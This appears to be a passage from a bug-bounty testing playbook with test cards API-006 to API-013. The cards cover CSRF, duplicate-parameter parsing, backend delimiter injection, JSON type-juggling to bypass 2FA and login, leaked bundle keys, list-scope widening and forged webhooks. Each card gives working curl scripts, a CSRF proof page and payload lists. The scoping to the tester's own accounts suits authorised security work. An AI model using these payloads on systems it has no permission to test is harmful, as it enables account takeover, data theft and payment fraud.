- **Proof:** one session, one operation, two surfaces: the current one applying the protection (asks for the
  code, strips the field, rejects the value) and the other completing without it, with the resulting state read
  back (A's e-mail changed with no code, B's private field in the old response, the unsanitised value stored).
  Name both routes. A field-filter gap alone is filed as Information Disclosure.
- **Not a finding when:** the old prefix reaches the same handler and applies the same step. The answer is 404 or
  410. The change stays pending until the code is entered (read `pending_email`). The old version returns a
  documented public subset. The only missing protection is a rate limit (`rate-limit`). The surface needs a
  credential A cannot get (a partner key). The host that answers is out of scope, or the programme lists its
  mobile API separately.
- **Escalate:** one unguarded old controller usually means the whole version is unguarded: authorisation on it is
  BAC-013, attributes API-001 and API-002, its description API-003. A skipped second factor on an e-mail change
  is account takeover with a known password: AUT chapter. Field-filter gaps feed INF-010.

### API-006 · A state-changing JSON endpoint also accepts a form, text/plain or GET request, so another site can send it with the victim's cookies

| | |
|---|---|
| **Severity** | Medium standalone for a state change on the victim's account; High when the change is the e-mail, password, second factor, an API key, a webhook or payout destination, or a role; Low for preferences |
| **Requires** | cookie-auth, state-change, account, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Cross-Site Request Forgery (CSRF) · CWE-352 |
| **Prior art** | #997615, #245346, #205953 |

- **Where:** state-changing JSON requests that authenticate by cookie and that still succeed when replayed with
  the Cookie header alone, without the CSRF header or token the client normally adds (`X-CSRF-Token`,
  `X-XSRF-TOKEN`, `X-Requested-With`). Prefer sensitive operations: e-mail and password change, 2FA settings,
  API-key or OAuth-app creation, webhook URLs, payout destinations, invitations and roles. GraphQL endpoints are
  GQL-008.
- **Test:** a browser sends a cross-site `application/json` request only after a CORS preflight the server would
  have to approve, so many JSON APIs are protected only by that content type. Form posts
  (`application/x-www-form-urlencoded`, `multipart/form-data`), `text/plain` bodies and GET navigations need no
  preflight. The framework often accepts them on the same route: Express with `urlencoded()` next to `json()`,
  a JSON parser registered for every type (`bodyParser.json({type: '*/*'})`), Rails and Laravel merging query and
  body parameters, Spring `@ModelAttribute`. A `_method` field in a form body (Rails, Laravel, Symfony, Express
  `method-override`) turns PUT, PATCH and DELETE routes into form posts.
- **How:**
  ```bash
  D="$E/evidence/$H/API-006"; mkdir -p "$D"; U="$T/api/v1/me"
  grep -i '^cookie:' "$E/accounts/A.headers" > "$D/A-cookie-only.headers"; C="-H @$D/A-cookie-only.headers"   # the cookie alone
  st(){ curl -sS "${HDR[@]}" $A "$U" | jq -r '.bio'; }
  # 0. control: the JSON request with the cookie alone (is the CSRF header required at all?)
  curl -sS "${HDR[@]}" $C -X PATCH "$U" -H 'Content-Type: application/json' -d '{"bio":"api006-json"}' -o /dev/null -w 'json, cookie only %{http_code} -> '; st
  # 1. the same change as each request a cross-site page can send
  curl -sS "${HDR[@]}" $C -X POST "$U" --data-urlencode 'bio=api006-form' -o /dev/null -w 'form POST %{http_code} -> '; st
  curl -sS "${HDR[@]}" $C -X POST "$U" --data-urlencode '_method=PATCH' --data-urlencode 'bio=api006-override' -o /dev/null -w 'form + _method %{http_code} -> '; st
  curl -sS "${HDR[@]}" $C -X POST "$U" -H 'Content-Type: text/plain' -d '{"bio":"api006-plain"}' -o /dev/null -w 'text/plain JSON %{http_code} -> '; st
  curl -sS "${HDR[@]}" $C -X POST "$U" --form-string 'bio=api006-multipart' -o /dev/null -w 'multipart %{http_code} -> '; st
  curl -sS "${HDR[@]}" $C "$U?bio=api006-get&_method=PATCH" -o /dev/null -w 'GET %{http_code} -> '; st
  # 2. the session cookie's SameSite attribute decides which variants a browser sends cross-site
  curl -sS "${HDR[@]}" -D- -o /dev/null "$T/" | grep -i '^set-cookie'
  ```
  The proof page, served from `$OOB` (another site) and opened in B's logged-in scriptable browser:
  ```html
  <!-- text/plain: the field name carries the JSON and the value closes it; the body is {"bio":"api006-csrf","x":"="} -->
  <form action="https://HOST/api/v1/me" method="POST" enctype="text/plain">
    <input name='{"bio":"api006-csrf","x":"' value='"}'>
  </form>
  <!-- form-encoded with a method override -->
  <form action="https://HOST/api/v1/me" method="POST">
    <input name="_method" value="PATCH"><input name="bio" value="api006-csrf">
  </form>
  <script>document.forms[0].submit()</script>
  ```
  A cookie with no `SameSite` attribute is treated as `Lax` by Chrome and Edge but is still sent on cross-site
  POSTs by Firefox and Safari: when the attribute is absent, run the page in Playwright's `firefox` or `webkit`.
- **Proof:** B's account shows `api006-csrf` after B's browser opened the page from another origin; attach the
  page, B's network log entry for the request, and the session cookie's attributes.
- **Not a finding when:** the session rides in an `Authorization` header or in local storage (then `cookie-auth`
  is false). Every simple variant gets 415 or 400. A CSRF token or custom header is required on those variants
  too. The cookie is `SameSite=Strict`, or `Lax` and only the POST variants work in every browser (Chrome's
  two-minute window for fresh cookies does not make a reliable proof). An Origin or Referer check refuses the
  page: test with the page, not with curl. The action is not sensitive (`csrf-low`: preferences, newsletter,
  logout).
- **Escalate:** token bypasses are the CSR chapter; method changes refused by authorisation are BAC-012. A GET
  that changes state also fires from an `<img>` in any page the victim views. A validator or WAF that parses only
  JSON skips the same fields sent form-encoded: resend API-001's refused attributes and API-007's duplicates as a
  form. A cross-site e-mail change to our alias, then a password reset, is account takeover: prove it on B.

### API-007 · A duplicated parameter or JSON key is read one way by the check and another way by the handler

| | |
|---|---|
| **Severity** | Medium standalone when a validation rule falls; High when the defeated check guards authorisation, a signature, a redirect host or a price |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Input Validation · CWE-235 |
| **Prior art** | #114169, #1011243, #105953 |

- **Where:** every check that refuses a value we control is a target, so the card has no gate beyond the
  chapter's: allow-lists of hosts and redirect URLs, attribute deny-lists (the attributes API-001 saw refused),
  ownership checks on ids, signatures computed over parameters, WAF rules, price and quantity validation. It
  pays most where two parsers sit in the path: a gateway or WAF in front of the application, a front API that
  forwards to a backend, a validator middleware (JSON schema, Joi, express-validator, marshmallow) separate from
  the model binder.
- **Test:** duplicate the parameter so the checking parser and the using parser pick different copies. Query and
  form parameters: PHP and Rails keep the last, Flask (`request.args.get`), Java servlets (`getParameter`) and Go
  (`Query().Get`) the first, ASP.NET joins them with commas, Express returns an array, and Python's
  `urllib.parse.parse_qsl` before 3.9.2 and 3.8.8 also split on `;`. JSON: most parsers keep the last duplicate
  key (JavaScript `JSON.parse`, Python `json`, Go `encoding/json`, PHP `json_decode`, Jackson by default), some
  reject the document, a few return the first. Keys that one parser folds and another does not (case under
  .NET's case-insensitive binding, a trailing `\u0000`, a lone surrogate `\ud800`) are duplicates to one layer and
  new keys to the other. Send both orders and read the state the server acted on.
- **How:**
  ```bash
  D="$E/evidence/$H/API-007"; mkdir -p "$D"; CT='Content-Type: application/json'
  # 0. control: a value the check refuses
  curl -sS "${HDR[@]}" $A -X PATCH "$T/api/v1/me" -H "$CT" -d '{"role":"admin"}' -o "$D/00-refused.json" -w 'refused %{http_code}\n'
  # 1. JSON duplicates in both orders, and keys one parser folds into the other; the stored value decides
  for b in '{"role":"member","role":"admin"}' '{"role":"admin","role":"member"}' '{"role":"member","Role":"admin"}' \
           '{"role":"member","role\u0000":"admin"}' '{"role":"member","role\ud800":"admin"}'; do
    printf '%-44s ' "$b"; curl -sS "${HDR[@]}" $A -X PATCH "$T/api/v1/me" -H "$CT" --data-binary "$b" -o /dev/null -w '%{http_code} -> '
    curl -sS "${HDR[@]}" $A "$T/api/v1/me" | jq -c '{role}'; sleep 1; done | tee "$D/01-json.txt"
  # 2. precedence on this stack: which copy of a repeated parameter comes back (a search that echoes its query)
  curl -sS "${HDR[@]}" $A "$T/api/v1/search?q=api007first&q=api007second" | grep -oE 'api007(first|second)' | sort | uniq -c
  curl -sS "${HDR[@]}" $A "$T/api/v1/search?q=api007first;q=api007second" | grep -oE 'api007(first|second)' | sort | uniq -c
  curl -sS "${HDR[@]}" $A -X POST "$T/api/v1/search?q=api007query" --data-urlencode 'q=api007body' | grep -oE 'api007(query|body)' | sort | uniq -c
  ```
  The same pattern against other checks:
  ```text
  redirect host   ?redirect_uri=https://<allowed host>/cb&redirect_uri=https://$OOB/cb        and the reverse order
  ownership       ?account_id=<A id>&account_id=<B id>    ?account_id[]=<A id>&account_id[]=<B id>    ?account_id=<A id>,<B id>
  separators      ?account_id=<A id>;account_id=<B id>    ?account_id=<A id>%26account_id=<B id>
  query vs body   POST ?amount=100 with body amount=1, and the reverse
  JSON            {"amount":100,"amount":1}    {"email":"<A address>","email":"<B address>"}
  ```
- **Proof:** the refused request and the duplicated one side by side, with the state the server acted on read back
  (the stored role, the redirect to `$OOB`, B's object in A's response, the amount charged), and which parser
  took which copy.
- **Not a finding when:** both orders are refused. The application uses the checked copy in both orders. The
  duplicate is accepted and the stored value is the one that passed the check. A WAF blocks the duplicate: that
  is the control holding. A duplicated parameter in a share link or an iframe URL that only changes text or the
  embedded page (#105953 paid $500 in 2015; reports of that shape are low or informative now, and
  `content-spoofing` where the policy lists it).
- **Escalate:** ownership checks defeated by a duplicate: BAC-002 lists every id position. A redirect-host check:
  the OAU chapter (code and token theft). A signature computed over the first copy: API-012. The duplicate
  forwarded by the server to another service: API-008.

### API-008 · A parameter is copied unencoded into a request the server sends to an internal API, and injected delimiters change that request

| | |
|---|---|
| **Severity** | Medium standalone when the injected delimiter changes filtering or adds parameters the front end does not offer; High when it returns another account's data or a field the front API never returns (a reset token, an internal flag) |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Input Validation · CWE-74 |
| **Prior art** | #800231, #473742 |

- **Where:** front APIs that call other services: backends for front ends, GraphQL resolvers over REST services,
  gateways, and integrations with partner APIs. Signs: error bodies from a different framework than the front
  one, field names such as `upstream`, `backend` or `service`, internal host names in errors, ids that look like
  path segments of another API. Ids that become path segments of an internal REST call (`/api/profile/<id>` in
  front, `GET /internal/v1/users/<id>` behind), search terms and filters forwarded as query strings, values used
  to build a partner API URL. There is no fact for a backend behind the API, and any API can have one, so the
  card has no gate beyond the chapter's.
- **Test:** inject the delimiters of the internal request into one value and look for a change only the backend
  could produce: `%23` truncates the backend query or path, `%26` adds a backend parameter, `%3f` starts a query
  from a path segment, `%2f` and `..%2f` move along the backend path. Truncation and an unknown parameter name
  first (an error that names the parameter proves the `&` arrived), then known backend parameters and fields the
  front API never returns. Aim every read at B's records.
- **How:**
  ```bash
  D="$E/evidence/$H/API-008"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  # query-string context: the value lands in ?username=<value>&... on the backend
  P='/api/v1/users/search?username='; V='<B username>'
  for s in '' '%23' '%23x' '%26' '%26x=y' '%26field=email' '%26fields=email,phone' '%26username=<A username>' '%3f' '%2f'; do
    printf '%-30s ' "$s"; curl -sS "${HDR[@]}" $A "$T$P$V$s" -o "$D/r.json" -w '%{http_code} %{size_download} '
    head -c 160 "$D/r.json" | tr '\n' ' '; echo; sleep "$W"; done | tee "$D/query-context.txt"
  # REST-path context: the id becomes a path segment of the backend call
  for s in "<B id>" "<B id>%2f" "<B id>%2f..%2f<B id>" "..%2f<B id>" "<B id>%23" "<B id>%3fx=y" "..%2f..%2f..%2f"; do
    printf '%-30s ' "$s"; curl -sS "${HDR[@]}" $A --path-as-is "$T/api/v1/profile/$s" -o "$D/r.json" -w '%{http_code} %{size_download} '
    head -c 160 "$D/r.json" | tr '\n' ' '; echo; sleep "$W"; done | tee "$D/path-context.txt"
  ```
  Then, from what the errors and the climb reveal:
  ```text
  username=<B username>%26field=passwordResetToken          a backend field the front never returns
  /api/v1/profile/..%2f..%2fv1%2fusers%2f<B id>%2ffield%2fpasswordResetToken%23   the same through the backend path
  ```
- **Proof:** the front request with the injected delimiter and a response only the backend could have produced: a
  field of B's that the front API never returns (for a reset token: B's token, then B's password reset with it,
  and stop), or a backend error naming the injected parameter, next to the same request without the delimiter.
- **Not a finding when:** the front end encodes the value before forwarding (every variant behaves like plain
  data). The change comes from the front API's own router: `%2f` decoded and routed by the front framework with
  no backend involved. The "backend error" is the front end's own 400. Truncation only changes which of our own
  records come back (low).
- **Escalate:** a backend field holding a secret: the AUT chapter for the takeover, proven on B. A climb that
  reaches the internal API's admin routes: BAC-011 at the backend. A partner URL whose host can be changed: the
  SSR chapter. A duplicate created in the forwarded request: API-007.

### API-009 · A secret or code comparison passes when the JSON value is a boolean, number, array or object instead of a string

| | |
|---|---|
| **Severity** | High standalone when a second factor, reset, verification or invitation check passes without the secret; Critical when a password login opens for any account (proven on B); Medium when a discount code, CSRF token or captcha check passes |
| **Requires** | login\|invite\|limited-action\|payments, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Improper Handling of Unexpected Data Type · CWE-1287 |
| **Prior art** | #792895, #86022, #202774 |

- **Where:** every request that carries a secret the server compares: the password at login and the current
  password on e-mail or password change, OTP and 2FA codes, reset and verification tokens, invitation and share
  tokens, CSRF tokens, captcha responses, coupon, gift-card and referral codes. Run every probe against our own
  account B's challenge or our own codes. Form-encoded bodies carry the same types through brackets in PHP,
  Rails and Express: `code[]=1` is an array, `code[x]=1` an object.
- **Test:** the parser hands the handler whatever JSON type arrives, and the comparison was written for strings.
  `true` passes a PHP `==` against any non-empty string; `0` passed it against a non-numeric string before PHP
  8; `"0e1"` equals a stored `0e...` value under `==`; PHP's `strcmp` returned NULL for an array before PHP 8, so
  `!strcmp(...)` was true; Python's `in` accepts `""` against any string; an array of candidates reaches
  `includes` or `in_array`; Node's `mysql` package expands an object into `` `key` = value `` pairs, so
  `{"password":{"password":1}}` becomes `` password = `password` = 1 ``, true for every row. Replace the secret
  with each type and follow the flow to the state it grants.
- **How:**
  ```bash
  D="$E/evidence/$H/API-009"; mkdir -p "$D"; CT='Content-Type: application/json'; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  U="$T/api/v1/auth/2fa/verify"; K='code'                    # B's login, stopped at the code prompt
  PRE="-H @$D/B-pre2fa.headers"                               # the cookie or token the password step returned for B
  BASE='{"challenge_id":"<challenge id from B password step>"}'
  # 0. control: a wrong string is refused
  curl -sS "${HDR[@]}" $PRE -X POST "$U" -H "$CT" -d "$(jq -c --arg k "$K" '.[$k]="000000"' <<<"$BASE")" -o /dev/null -w 'wrong string %{http_code}\n'
  # 1. the same request with every JSON type in place of the secret
  for v in 'true' 'false' '0' '1' 'null' '[]' '{}' '["000000"]' '[["000000"]]' '{"code":1}' '1e9999' '-0' '"0e1"' '""' '" "'; do
    printf '%-16s ' "$v"; curl -sS "${HDR[@]}" $PRE -X POST "$U" -H "$CT" -d "$(jq -c --arg k "$K" --argjson v "$v" '.[$k]=$v' <<<"$BASE")" \
      -o "$D/r.json" -w '%{http_code} %{size_download} '; head -c 120 "$D/r.json"; echo; sleep "$W"; done | tee "$D/01-types.txt"
  # 2. arrays: wrong codes alone, then the same wrong codes plus the right one read from B's authenticator
  curl -sS "${HDR[@]}" $PRE -X POST "$U" -H "$CT" -d "$(jq -c --arg k "$K" '.[$k]=["000000","111111"]' <<<"$BASE")" -o /dev/null -w 'wrong array %{http_code}\n'
  curl -sS "${HDR[@]}" $PRE -X POST "$U" -H "$CT" -d "$(jq -c --arg k "$K" --arg c '<current code of B>' '.[$k]=["000000","111111",$c]' <<<"$BASE")" -D "$D/02-array.hdr" -o "$D/02-array.json"
  # 3. a password login with an object value (Node and mysqljs), against B's username
  curl -sS "${HDR[@]}" -X POST "$T/api/v1/auth/login" -H "$CT" -d '{"username":"<B username>","password":{"password":1}}' -D "$D/03-login.hdr" -o "$D/03-login.json"
  ```
  An array that holds the right code proves the server accepts candidates in bulk without guessing any; never
  send the full code space. When a value is accepted, finish the flow and read `me` with the session it issued.
- **Proof:** the wrong string refused, the typed value accepted, and the state that follows: B's session issued
  (`me` returning B's identity), the invitation accepted into our account, the discount applied to our cart. For
  arrays: the wrong-codes array refused and the same array plus the right code accepted, which shows one attempt
  can carry any number of guesses.
- **Not a finding when:** a typed value returns 500 or a validation error (type handling, not a bypass; a stack
  trace is `version-disclosure`). A 200 carries an error message or `"success":false`. The step reports success
  but the next step still asks for the secret: follow it to the session. The number `123456` is coerced to the
  string `"123456"` and compared correctly. An array is accepted only when its first element is the right code.
- **Escalate:** object values reaching a database lookup (`{"$ne":null}`): the NSQ and SQL chapters. A typed
  value accepted by an ownership check (`{"id":["<A id>","<B id>"]}`): BAC-002. Address arrays in a reset
  request: AUT-003. Codes accepted in arrays turn AUT-008's arithmetic into one request per array; codes echoed
  or not bound to the flow are AUT-005.

### API-010 · An API key or client secret shipped in the front-end bundle reads or changes data on the target's API that an anonymous visitor cannot

| | |
|---|---|
| **Severity** | Medium standalone when the key reads internal non-personal data or reaches routes the public client never calls; High when the key alone reads another user's records or an admin route; None when it grants only what the public page already shows |
| **Requires** | spa |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Use of Hard-coded Credentials · CWE-798 |
| **Prior art** | #1218754, #979333, #1051029 |

- **Where:** first-party credentials in the bundles, their lazy chunks (admin, partner and internal screens carry
  their own) and inline configuration (`window.__ENV__`, `__NEXT_DATA__`, `/env.js`, `/config.json`) that are
  meant for the target's own hosts: `x-api-key` and `Ocp-Apim-Subscription-Key` gateway keys, `apikey=`
  parameters, `Authorization: Basic` built from constants, `client_id` and `client_secret` pairs for a
  `client_credentials` token, admin keys of a search or content backend the organisation runs. Vendor keys
  (Google Maps, Stripe, Sentry, Firebase, Algolia) are INF-004.
- **Test:** two cases. A key the public client sends in its own requests is public; the question is what else it
  unlocks: gateways issue one key per client application and accept it on every route behind them, including
  partner and admin routes the public client never calls. Compare the same requests with no credentials and
  with the key alone, aimed at A's and B's own data. A key that sits in the bundle but never appears in the
  client's traffic (a dead admin path, a server-side secret inlined at build time) is a discovered credential:
  one read-only identity call shows what it is, then stop.
- **How:**
  ```bash
  D="$E/evidence/$H/API-010"; mkdir -p "$D"; J="$E/recon/$H/js"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  # 1. key-shaped constants next to the names that carry them, in every bundle and chunk
  grep -rnoiE "(x-api-key|api[_-]?key|apikey|x-app-key|client[_-]?key|subscription-key|client[_-]?secret|app[_-]?secret|access[_-]?token)[\"' ]*[:=,] *[\"'][A-Za-z0-9._~+/=-]{16,}[\"']" "$J" | sort -u | head -40
  grep -rnoE "(Basic|Bearer) [A-Za-z0-9._~+/=-]{20,}" "$J" | sort -u | head -20
  # 2. does the public client send it? (the walk's saved requests)
  K='<key>'; KH='x-api-key'                       # the value and the header that carries it
  grep -rlF -- "$K" "$E/recon/$H/requests/" | head
  # 3a. sent by the public client: no credentials versus the key alone, on routes the client never calls, aimed at our own data
  for u in "/api/v1/users/<B id>" "/api/v1/orgs/<A org id>/settings" "/api/v1/admin/settings" "/api/partner/v1/accounts/<B id>" "/api/internal/config"; do
    n=$(curl -sS "${HDR[@]}" -o /dev/null -w '%{http_code}/%{size_download}' "$T$u"); sleep "$W"
    k=$(curl -sS "${HDR[@]}" -H "$KH: $K" -o "$D/key-$(printf %s "$u" | md5sum | cut -c1-8).json" -w '%{http_code}/%{size_download}' "$T$u"); sleep "$W"
    printf '%-44s none=%-10s key=%s\n' "$u" "$n" "$k"; done | tee "$D/compare.txt"
  curl -sS "${HDR[@]}" $B "$T/api/v1/users/<B id>" -o "$D/control-B-own.json"
  # 3b. in the bundle but never sent by the client: one read-only identity call, whichever fits, then stop
  curl -sS "${HDR[@]}" -H "$KH: $K" "$T/api/v1/me" -o "$D/identity.json" -w 'identity %{http_code}\n'
  curl -sS "${HDR[@]}" -X POST "$T/oauth/token" -d grant_type=client_credentials --data-urlencode 'client_id=<client id>' \
    --data-urlencode "client_secret=$K" | jq '{scope, token_type, expires_in}'          # the granted scope is the answer; the token is not used
  ```
- **Proof:** for 3a, the bundle line and the public client's request that carries the key, then the key alone
  reading B's private object (or an admin-only route) while the same request without it is refused, and B's own
  view of the object. For 3b, the bundle URL and line with the key cut to its first and last four characters, and
  the single identity call naming the principal, role or scope. State what that scope allows from the product's
  documentation, not from use.
- **Not a finding when:** the key grants only what the public page shows (a search key for the public catalogue, a
  content key for published pages). It is a vendor key designed to be public (INF-004 has the list). The "admin"
  route answers 200 with the SPA shell. The only gain is calling a paid backend on the organisation's quota,
  which programmes rate low or N/A. The token is our own session's, rendered per user: fetch the same file with
  no session and compare.
- **Escalate:** the key's routes are new surface: API-003 and BAC-011 with the key. A `client_credentials` token
  whose scope reads `admin` or `write:*` is reported from the scope string. User-created keys and their scopes:
  API-015. Keys that still work after the organisation rotated them: AUT-017.

### API-011 · A list endpoint returns other accounts' records when its scoping parameter or cursor is removed, widened or rewritten

| | |
|---|---|
| **Severity** | High standalone when the list crosses accounts or tenants and carries personal or financial data; Medium for other tenants' non-personal records; Low when it only lifts a page-size cap on data the caller may read |
| **Requires** | two-accounts |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Improper Access Control - Generic · CWE-639 |
| **Prior art** | #852306, #902733, #138244 |

- **Where:** list, feed, report and export-preview endpoints whose scope is a parameter: `user_id=`, `owner=`,
  `account_id=`, `org_id=`, `filter[...]=`, `where=`, `q=`, `scope=mine|all`, `mine=true`, `include_all`,
  `status=all`, `deleted=true`; page controls `limit`, `per_page`, `page_size`, `pageSize`, `size`,
  `max_results`, `count`, `first`, `$top`; cursors and page tokens (`cursor`, `next`, `page_token`, `after`,
  `continuation`) that decode to JSON with an id or a filter inside. Find them in the list requests A's client
  sends, in the description's parameters, and in the `next` links of responses. Search, autocomplete and
  `include=` expansion are BAC-009.
- **Test:** the handler builds the query from the client's filter and adds the caller's scope only in the branch
  the client normally takes. Remove the scoping parameter, empty it, give it a wildcard (`*`, `%`), B's id, a
  list or a negation; decode the cursor and change the id or filter inside it; raise the page size to see
  whether a cap exists. B stores a marker in two private records; every variant also filters on that marker
  where the endpoint allows it, so a widened scope returns B's records and nobody else's. Read sizes from the
  count field, not by paging.
- **How:**
  ```bash
  D="$E/evidence/$H/API-011"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  M='api011-marker'; L="$T/api/v1/invoices"          # B created two private invoices carrying M; A's client sends ?user_id=<A id>
  probe(){  # $1 = query string; keeps the count and B's records only, never other records
    curl -sS -g "${HDR[@]}" $A "$L?$1" -o "$D/tmp.json" -w '%{http_code} '
    jq -r '[(.total // .count // .meta.total // .pagination.total // "n/a"), ((.data // .items // .results // .) | if type=="array" then length else "?" end)] | @tsv' "$D/tmp.json" | tr '\n' ' '
    jq -c --arg m "$M" '[(.data // .items // .results // .)[]? | select(tostring | contains($m))]' "$D/tmp.json" > "$D/B-$(printf %s "$1" | md5sum | cut -c1-8).json"
    printf 'B-records=%s\n' "$(jq length "$D/B-$(printf %s "$1" | md5sum | cut -c1-8).json")"; rm -f "$D/tmp.json"; }
  for q in "user_id=<A id>" "q=$M" "user_id=&q=$M" "user_id=*&q=$M" "user_id=%25&q=$M" "user_id=<B id>" "user_id[]=<A id>&user_id[]=<B id>" \
           "user_id[ne]=<A id>&q=$M" "scope=all&q=$M" "mine=false&q=$M" "include_all=true&q=$M" "filter[user_id]=&q=$M"; do
    printf '%-46s ' "$q"; probe "$q"; sleep "$W"; done | tee "$D/01-scope.txt"
  # cursor: decode the next-page token A received, change the scope inside, re-encode the same way
  N=$(curl -sS "${HDR[@]}" $A "$L?user_id=<A id>&limit=1" | jq -r '.next_cursor // .meta.next_cursor // .cursor // empty'); printf '%s' "$N" | base64 -d 2>/dev/null; echo
  C2=$(printf '{"offset":0,"user_id":"%s"}' '<B id>' | base64 -w0)        # mirror the decoded structure; URL-safe if the original was
  curl -sS "${HDR[@]}" $A --get --data-urlencode "cursor=$C2" "$L" | grep -c "$M"
  # page-size cap on A's own list: status and size only
  for n in 100 1000 100000 -1 0; do curl -sS "${HDR[@]}" $A -o /dev/null -w "limit=$n %{http_code} %{size_download}\n" "$L?user_id=<A id>&limit=$n"; sleep "$W"; done
  ```
- **Proof:** A's request with the scope removed, widened or rewritten returning B's marker records, B's own view of
  them, and the control with A's own scope returning only A's; the `total` from one response states the size of
  the exposure. No record of a real third party enters the evidence: `probe` keeps counts and B's records only.
- **Not a finding when:** the unscoped list still returns only A's records (the server adds the scope whatever is
  sent). The records are public by design (a public directory, published listings): a bigger page of public data
  is a scraping concern (`rate-limit`) or a performance one (`dos`). The extra records are A's colleagues in the
  same tenant and A's role may see them. Only a count comes back with no records (an existence or size oracle:
  low).
- **Escalate:** a tenant id inside the cursor: BAC-006. Wildcards that reach a SQL `LIKE` or a search query string
  (`%`, `_`, `*`, `?`): the SQL and NSQ chapters (#852306 was a `LIKE` wildcard injection). GraphQL connection
  arguments: GQL-003. The same list as an export: BAC-008.

### API-012 · A webhook or callback receiver acts on an event whose signature is missing, wrong or computed over less than the payload

| | |
|---|---|
| **Severity** | High standalone when a forged event changes money or access state (an order marked paid, a plan activated); Medium when it changes other state of our own objects; Low when the receiver only records the event |
| **Requires** | payments\|url-fetch, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Improper Verification of Cryptographic Signature · CWE-347 |
| **Prior art** | #894325, #3670955, #3941626 |

- **Where:** routes on the target's own hosts that third parties call: payment notifications (`/webhooks/stripe`,
  `/paypal/ipn`, `/payments/callback`, `/notify`, `/adyen/notifications`), source-control and CI hooks
  (`/hooks/github`, `/gitlab/webhook`, `/bitbucket/events`), chat and messaging (`/slack/events`,
  `/slack/commands`, `/twilio/sms`), inbound e-mail parsing, provisioning (`/scim/v2/`), marketplace app lifecycle
  (`/shopify/uninstall`, `/app/installed`). Find them in integration settings (the URL the product tells
  customers to paste), the API description, the public integration guides, and the bundles. The sender's
  documentation names the signature header and algorithm the receiver must check. There is no fact for inbound
  webhooks; payments and integrations are the closest gate.
- **Test:** send the receiver an event for our own object in the sender's documented format: without the
  signature header, with a wrong signature, with an empty one, and signed with a sample secret. A receiver that
  verifies computes the HMAC (or checks the asymmetric signature) over the exact raw body with its own secret and
  rejects all of these. Common failures: verification only when the header is present, an exception that falls
  through to processing (#3941626, "fail-open MAC"), a signature that covers some fields while the handler reads
  others (#3670955, an HMAC that omitted the endpoint and the payload), the guide's example secret left in place.
  The order's state, not the status code, decides.
- **How:**
  ```bash
  D="$E/evidence/$H/API-012"; mkdir -p "$D"; CT='Content-Type: application/json'
  R="$T/webhooks/payments"; O='<id of an unpaid order of A>'          # the receiver, and our own unpaid order
  EV="{\"id\":\"evt_api012_1\",\"type\":\"payment_intent.succeeded\",\"data\":{\"object\":{\"id\":\"pi_api012\",\"amount\":100,\"currency\":\"usd\",\"status\":\"succeeded\",\"metadata\":{\"order_id\":\"$O\"}}}}"
  st(){ curl -sS "${HDR[@]}" $A "$T/api/v1/orders/$O" | jq -c '{status, payment_status, paid}'; }
  st                                                                                       # 0. unpaid before
  curl -sS "${HDR[@]}" -X POST "$R" -H "$CT" -d "$EV" -o "$D/1-nosig.txt" -w 'no signature %{http_code} -> '; st
  curl -sS "${HDR[@]}" -X POST "$R" -H "$CT" -H "Stripe-Signature: t=$(date +%s),v1=$(printf '0%.0s' $(seq 64))" -d "$EV" -o "$D/2-badsig.txt" -w 'wrong signature %{http_code} -> '; st
  curl -sS "${HDR[@]}" -X POST "$R" -H "$CT" -H 'Stripe-Signature;' -d "$EV" -o "$D/3-emptysig.txt" -w 'empty header %{http_code} -> '; st
  # 4. signed with a sample secret (the receiver deployed with the integration guide's example)
  for s in secret changeme test whsec_test '<example secret from the integration guide>'; do
    t=$(date +%s); sig=$(printf '%s.%s' "$t" "$EV" | openssl dgst -sha256 -hmac "$s" -hex | awk '{print $NF}')
    curl -sS "${HDR[@]}" -X POST "$R" -H "$CT" -H "Stripe-Signature: t=$t,v1=$sig" -d "$EV" -o /dev/null -w "secret=$s %{http_code} -> "; st; sleep 1; done
  ```
  Other senders, same tests with their own header:
  ```text
  GitHub    X-Hub-Signature-256: sha256=hex(HMAC-SHA256(secret, raw body))
  Shopify   X-Shopify-Hmac-Sha256: base64(HMAC-SHA256(secret, raw body))
  Slack     X-Slack-Signature: v0=hex(HMAC-SHA256(secret, "v0:" + X-Slack-Request-Timestamp + ":" + raw body))
  Twilio    X-Twilio-Signature: base64(HMAC-SHA1(auth token, full URL + sorted POST parameters))
  PayPal    IPN fields (txn_id, payment_status=Completed, mc_gross, custom=<A order id>): the receiver must post them back
            with cmd=_notify-validate; a receiver that marks the order paid without that call never verified anything
  ```
  Events go only to the target's receiver and name only our own objects; nothing is sent to the provider.
- **Proof:** our own order or object before and after the unsigned or wrongly signed event (unpaid, then paid; not
  deployed, then deployed), the event request and response, and the sender's documentation of the signature the
  receiver must verify.
- **Not a finding when:** the receiver answers 200 to everything and does nothing: providers retry on errors, so
  many receivers acknowledge first and verify later. The receiver re-fetches the event or the payment from the
  provider's API before acting (correct design: the forged id is unknown there and nothing changes). The route
  belongs to a sample or reference app the programme does not run (#3697491 was closed informative for that
  reason). The receiver is the provider's own service (`third-party`). An outbound webhook the product sends to
  customers without a signature is a missing feature, informative on its own.
- **Escalate:** the same receiver with an order that is not ours would mark it paid: say so from the code path,
  never send it. Event fields that reach SQL or a template (#894325 was a SQL injection behind the signature
  bypass). Completion steps that trust the browser instead of the notification: BIZ-007. A signature computed
  over the first copy of a duplicated field: API-007.

### API-013 · A gRPC, gRPC-web or JSON-RPC service lists its methods, and a method the client never calls answers without the client's checks

| | |
|---|---|
| **Severity** | Medium standalone for an unlisted method returning internal non-personal data (node, debug or configuration details); High when it returns other users' data, performs an administrative action or opens a login that skips SSO or 2FA; None for the method list alone |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
